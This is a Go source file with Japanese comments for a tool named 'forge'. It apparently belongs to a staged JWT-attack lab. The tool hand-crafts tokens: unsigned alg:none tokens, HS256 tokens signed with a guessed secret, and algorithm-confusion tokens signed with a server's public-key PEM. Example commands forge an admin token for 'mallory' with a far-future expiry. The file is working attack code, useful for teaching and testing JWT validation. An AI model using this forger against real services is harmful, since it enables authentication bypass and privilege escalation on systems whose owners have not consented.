// forge はheaderとpayloadを自分で組み立ててJWTを手作りするツール。
// ライブラリもサーバも使わない。標準出力にトークンだけを出すので、
// curlと組み合わせられる: TOKEN=$(go run ./tools/forge -header '...' -payload '...')
//
// 例(手順の全体はdocs/04, 05, 06を参照):
//
//	# alg:none偽造 (stage3)
//	go run ./tools/forge -header '{"alg":"none","typ":"JWT"}' \
//	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}'
//
//	# 推測/既知の鍵で署名 (stage4, stage5の混同攻撃)
//	go run ./tools/forge -header '{"alg":"HS256","typ":"JWT"}' \
//	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}' \
//	  -secret sunny
//
//	# ファイルのバイト列そのもので署名 (stage5: 取得した/pubkeyのPEM)
//	go run ./tools/forge -header '{"alg":"HS256","typ":"JWT"}' \
//	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}' \
//	  -secret-file pubkey.pem
package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"flag"
	"fmt"
	"os"
)

func main() {
	header := flag.String("header", `{"alg":"none","typ":"JWT"}`, "raw JSON header")
	payload := flag.String("payload", "", "raw JSON payload (required)")
	secret := flag.String("secret", "", "HMAC secret as a literal string")
	secretFile := flag.String("secret-file", "", "path to a file whose exact bytes are the HMAC secret")
	flag.Parse()

	if *payload == "" {
		fmt.Fprintln(os.Stderr, "error: -payload is required")
		os.Exit(1)
	}

	signingInput := base64.RawURLEncoding.EncodeToString([]byte(*header)) + "." +
		base64.RawURLEncoding.EncodeToString([]byte(*payload))

	var secretBytes []byte
	switch {
	case *secretFile != "":
		b, err := os.ReadFile(*secretFile)
		if err != nil {
			fmt.Fprintln(os.Stderr, "error reading -secret-file:", err)
			os.Exit(1)
		}
		secretBytes = b
	case *secret != "":
		secretBytes = []byte(*secret)
	}

	if secretBytes == nil {
		// 鍵が渡されていない場合はalg:none相当のトークンとして扱い、
		// 署名部分をあえて空のままにする。
		fmt.Println(signingInput + ".")
		return
	}

	mac := hmac.New(sha256.New, secretBytes)
	mac.Write([]byte(signingInput))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	fmt.Println(signingInput + "." + sig)
}
